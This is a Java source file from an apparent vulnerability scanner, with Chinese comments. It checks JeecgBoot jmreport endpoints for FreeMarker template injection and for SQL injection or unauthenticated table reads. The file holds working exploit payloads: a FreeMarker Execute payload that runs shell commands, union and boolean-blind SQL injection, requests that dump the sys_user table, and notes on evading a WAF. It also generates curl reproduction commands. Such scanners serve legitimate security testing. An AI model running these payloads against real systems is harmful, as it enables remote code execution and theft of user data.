package com.jeescan.checks;

import com.jeescan.core.Detector;
import com.jeescan.core.Http;
import com.jeescan.core.Json;
import com.jeescan.core.Result;

/**
 * #3 / #4 SSTI 其余入口 + #7 路径注入。
 *
 * 三个类放一起是因为它们结构相似，都是"参数进模板/路径"，判定逻辑一致：
 *   算术探针（随机数乘积）→ 命中 → 破坏性反例 → 不复现 → 确认
 */
public final class SstiOthers {

    private SstiOthers() {}

    // =================================================================
    // #3 loadTableData (CVE-2023-41544)
    // 【POC 来源】主 POC = 网上公开版本（freemarker Execute + value()）
    // =================================================================
    public static class LoadTableData extends Detector {
        public LoadTableData() {
            super("3", "loadTableData SSTI",
                  "/jmreport/loadTableData", "CVE-2023-41544", "critical", false,
                  "主用网上 POC（Execute 类 + value() 调用），辅以算术探针与反例");
        }

        @Override
        public Result run(Ctx ctx) {
            Result res = newResult();
            Http h = ctx.http;
            String path = ctx.p("jmreport/loadTableData");
            String url = h.url(path);

            // A. 基线
            String baseBody = Json.obj("dbSource", "", "sql", "select 1",
                    "tableName", "test_demo", "pageNo", "1", "pageSize", "10");
            Http.Resp base = h.postJson(path, baseBody);
            res.trace("A. 基线", "POST", url, baseBody, base, "接口可达性");
            if (isRst(base)) return res.set(Result.State.ERROR, "基线被重置：" + base.err);

            // B. 网上公开 POC（Execute 类）
            String cmd = "id";
            String webPoc = "select '<#assign value=\"freemarker.template.utility.Execute\"?new()>"
                    + "${value(\"" + cmd + "\")}'";
            String webBody = Json.obj("dbSource", "", "sql", webPoc,
                    "tableName", "test_demo", "pageNo", "1", "pageSize", "10");
            Http.Resp w = h.postJson(path, webBody);
            res.trace("B. 网上POC Execute 执行 " + cmd, "POST", url, webBody, w,
                    "回显含 uid= 即为 RCE");

            if (has(w, "uid=") || has(w, "gid=")) {
                res.ev("网上公开 POC 直接命中（Execute 类执行 " + cmd + "）");
                res.repro("curl -s -X POST '" + url + "' -H 'Content-Type: application/json' --data '"
                        + webBody + "'");
                return res.set(Result.State.VULN, "loadTableData SSTI，Execute 命令执行成功");
            }

            // C. 算术探针
            String[] probe = arithProbe();
            String expr = probe[0].substring(1);
            String expect = probe[1];
            String sql = "select '<#assign v=" + expr + ">${v}'";
            String body = Json.obj("dbSource", "", "sql", sql,
                    "tableName", "test_demo", "pageNo", "1", "pageSize", "10");
            Http.Resp p1 = h.postJson(path, body);
            res.trace("C. 算术探针 " + expr + " (期望 " + expect + ")", "POST", url, body, p1,
                    "模板被执行则应出现 " + expect);

            if (!has(p1, expect)) {
                return res.set(Result.State.SAFE, "网上POC 与算术探针均未命中");
            }

            // D. 反例
            String broken = expr.replace("*", "**");
            String negBody = Json.obj("dbSource", "", "sql",
                    "select '<#assign v=" + broken + ">${v}'",
                    "tableName", "test_demo", "pageNo", "1", "pageSize", "10");
            Http.Resp neg = h.postJson(path, negBody);
            res.trace("D. 反例（破坏运算符）", "POST", url, negBody, neg,
                    "语法破坏后不复现才算真");
            if (has(neg, expect)) {
                return res.set(Result.State.MAYBE, "反例同样回显 " + expect + "，疑似固定响应");
            }

            res.ev("FreeMarker 求值 " + expr + " → " + expect);
            res.ev("网上 Execute POC 未命中（可能被 SAFER_RESOLVER 拦），但模板注入成立");
            res.repro("curl -s -X POST '" + url + "' -H 'Content-Type: application/json' --data '" + body + "'");
            return res.set(Result.State.VULN, "loadTableData FreeMarker SSTI 确认");
        }
    }

    // =================================================================
    // #4 qurestSql FreeMarker
    // 【POC 来源】主 POC = 网上公开版本（apiSelectId + updatexml union）
    // =================================================================
    public static class QurestSqlSsti extends Detector {
        public QurestSqlSsti() {
            super("4", "qurestSql SSTI",
                  "/jmreport/qurestSql", "Freemarker", "critical", false,
                  "主用网上 POC（apiSelectId 结构），辅以算术探针与反例");
        }

        @Override
        public Result run(Ctx ctx) {
            Result res = newResult();
            Http h = ctx.http;
            String path = ctx.p("jmreport/qurestSql");
            String url = h.url(path);

            String baseBody = Json.obj("apiSelectId", "1", "id", "1");
            Http.Resp base = h.postJson(path, baseBody);
            res.trace("A. 基线", "POST", url, baseBody, base, "接口可达性");
            if (isRst(base)) return res.set(Result.State.ERROR, "基线被重置：" + base.err);

            // B. 网上公开 POC（apiSelectId 结构 + Execute）
            String cmd = "id";
            String webPoc = "select '<#assign ex=\"freemarker.template.utility.Execute\"?new()>"
                    + "${ex(\"" + cmd + "\")}'";
            String webBody = Json.obj("apiSelectId", "1316997232402231298", "id", webPoc);
            Http.Resp w = h.postJson(path, webBody);
            res.trace("B. 网上POC apiSelectId 结构", "POST", url, webBody, w,
                    "回显含 uid= 即为 RCE");

            if (has(w, "uid=") || has(w, "gid=")) {
                res.ev("网上公开 POC 直接命中");
                res.repro("curl -s -X POST '" + url + "' -H 'Content-Type: application/json' --data '"
                        + webBody + "'");
                return res.set(Result.State.VULN, "qurestSql 命令执行成功");
            }

            // C. 网上 POC 的 union 变形
            String[] probe = arithProbe();
            String expr = probe[0].substring(1);
            String expect = probe[1];
            String unionBody = Json.obj("apiSelectId", "1",
                    "id", "1' union all select 1,'<#assign v=" + expr + ">${v}',3,4,5,6,7 "
                            + "from dual where '1'='1");
            Http.Resp p1 = h.postJson(path, unionBody);
            res.trace("C. union 变形探针 " + expr, "POST", url, unionBody, p1,
                    "期望出现 " + expect);

            if (!has(p1, expect)) {
                String body2 = Json.obj("apiSelectId", "1",
                        "id", "select '<#assign v=" + expr + ">${v}'");
                Http.Resp p2 = h.postJson(path, body2);
                res.trace("C2. 纯 select 探针", "POST", url, body2, p2, "换纯 select 形式");
                if (!has(p2, expect)) {
                    return res.set(Result.State.SAFE, "网上POC 与算术探针均未命中");
                }
                unionBody = body2;
            }

            // D. 反例
            String broken = expr.replace("*", "**");
            String negBody = Json.obj("apiSelectId", "1",
                    "id", "select '<#assign v=" + broken + ">${v}'");
            Http.Resp neg = h.postJson(path, negBody);
            res.trace("D. 反例", "POST", url, negBody, neg, "破坏语法后不复现才算真");
            if (has(neg, expect)) {
                return res.set(Result.State.MAYBE, "反例同样回显，疑似固定响应");
            }

            res.ev("FreeMarker 求值 " + expr + " → " + expect);
            res.repro("curl -s -X POST '" + url + "' -H 'Content-Type: application/json' --data '" + unionBody + "'");
            return res.set(Result.State.VULN, "qurestSql FreeMarker SSTI 确认");
        }
    }

    // =================================================================
    // #7 getDictItemsByTable 注入 / 任意表读取
    // 【POC 来源】网上公开版本：
    //   GET /sys/ng-alain/getDictItemsByTable/'%20from%20sys_user/*,%20'/x.js
    //   以及 Shiro 绕过形式（QVD-2026-56312）：
    //   GET /sys/dict/getDictItems/{table},{text},{code}.js
    //   GET /sys/dict/getDictItems/{table},{text},{code},{filterSql}#.js
    // =================================================================
    public static class GetDictItemsByTable extends Detector {
        public GetDictItemsByTable() {
            super("7", "getDictItemsByTable 注入",
                  "/sys/ng-alain/getDictItemsByTable", "路径/SQL片段注入", "high", false,
                  "主用网上 POC（' from sys_user/* 结构），并测 .js 绕过与 filterSql 注入");
        }

        @Override
        public Result run(Ctx ctx) {
            Result res = newResult();
            Http h = ctx.http;

            // A. 基线：正常字典
            String basePath = ctx.p("sys/dict/getDictItems/sex");
            Http.Resp base = h.get(basePath);
            res.trace("A. 基线（正常字典 sex）", "GET", h.url(basePath), null, base,
                    "接口可达性");

            // B. 网上 POC 1：getDictItemsByTable + ' from sys_user/*
            String webPath = ctx.p("sys/ng-alain/getDictItemsByTable/'%20from%20sys_user/*,%20'/x.js");
            Http.Resp web = h.get(webPath);
            res.trace("B. 网上POC getDictItemsByTable", "GET", h.url(webPath), null, web,
                    "网上公开 POC 原样结构（from sys_user）");
            if (hasIgnoreCase(web, "SQLSyntaxError") || hasIgnoreCase(web, "doesn't exist")
                    || hasIgnoreCase(web, "Unknown column") || hasIgnoreCase(web, "root:x:")
                    || hasIgnoreCase(web, "username")) {
                res.ev("网上 getDictItemsByTable POC 命中");
                res.repro("curl -s '" + h.url(webPath) + "'");
                return res.set(Result.State.VULN, "getDictItemsByTable 注入确认");
            }

            // C. 任意表读取（实测：.js 会触发 WAF RST，不加 .js 反而直通）
            String dumpPath = ctx.p("sys/dict/getDictItems/sys_user,realname,username");
            Http.Resp d1 = h.get(dumpPath);
            res.trace("C. 任意表读取（不加 .js）", "GET", h.url(dumpPath), null, d1,
                    "实测：本类目标未启 Shiro 拦截，直接可读");

            String dumpJs = ctx.p("sys/dict/getDictItems/sys_user,realname,username.js");
            Http.Resp d2 = h.get(dumpJs);
            res.trace("C2. 任意表读取（带 .js）", "GET", h.url(dumpJs), null, d2,
                    "QVD-2026-56312 的 .js 绕过；部分目标上 .js 会被 WAF 拦");

            boolean dumpHit = jsonSuccess(d1) && countValues(d1) > 0;
            boolean dumpHitJs = jsonSuccess(d2) && countValues(d2) > 0;

            // D. filterSql 布尔注入（不加 .js，用 # 注释）
            boolean sqliHit = false;
            String trueUrl = ctx.p("sys/dict/getDictItems/sys_user,realname,id,1=1#");
            String falseUrl = ctx.p("sys/dict/getDictItems/sys_user,realname,id,1=2#");
            Http.Resp t1 = h.get(trueUrl);
            Http.Resp f1 = h.get(falseUrl);
            res.trace("D. filterSql 布尔真 1=1#", "GET", h.url(trueUrl), null, t1,
                    "期望有数据返回");
            res.trace("D2. filterSql 布尔假 1=2#", "GET", h.url(falseUrl), null, f1,
                    "期望空集，形成差分");

            int ct = countValues(t1);
            int cf = countValues(f1);
            if (ct > 0 && cf == 0) {
                sqliHit = true;
                res.ev("filterSql 布尔差分成立：1=1 返回 " + ct + " 条，1=2 返回 0 条");
            }

            if (sqliHit) {
                res.repro("curl -s '" + h.url(trueUrl) + "'    # 有数据");
                res.repro("curl -s '" + h.url(falseUrl) + "'    # 空集");
                return res.set(Result.State.VULN, "filterSql 布尔盲注确认");
            }

            if (dumpHit || dumpHitJs) {
                res.ev("任意表读取成功（" + (dumpHit ? "无需 .js" : "需 .js") + "）");
                res.repro("curl -s '" + h.url(dumpHit ? dumpPath : dumpJs) + "'");
                return res.set(Result.State.VULN, "getDictItems 未授权任意表读取");
            }

            if (isRst(web)) {
                return res.set(Result.State.MAYBE,
                        "网上 POC 被 WAF 重置（from 是黑名单词），需拆词绕过");
            }
            return res.set(Result.State.SAFE, "未见注入或未授权读取特征");
        }

        /** 统计响应里 value 字段数量，用于布尔差分。 */
        private static int countValues(Http.Resp r) {
            if (r == null || r.text == null) return 0;
            int n = 0, idx = 0;
            while ((idx = r.text.indexOf("\"value\"", idx)) >= 0) { n++; idx += 7; }
            return n;
        }
    }
}
